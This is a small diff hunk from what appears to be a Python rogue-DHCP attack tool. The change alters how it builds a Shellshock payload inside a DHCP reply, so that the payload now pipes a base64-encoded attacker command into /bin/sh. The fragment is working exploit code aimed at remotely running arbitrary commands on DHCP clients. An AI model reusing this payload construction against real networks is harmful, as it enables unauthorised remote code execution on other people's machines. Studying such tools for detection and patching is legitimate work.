@@ -186,7 +186,7 @@ def dhcp_reply(request):
 
             if args.shellshock_command is not None:
                 b64command = b64encode(net_settings + args.shellshock_command)
-                shellshock_url = "() { :" + "; }; " + b64command
+                shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64command + ")"
                 if len(shellshock_url) > 255:
                     print "[ERROR] Len of command is very big!"
                     shellshock_url = "A"
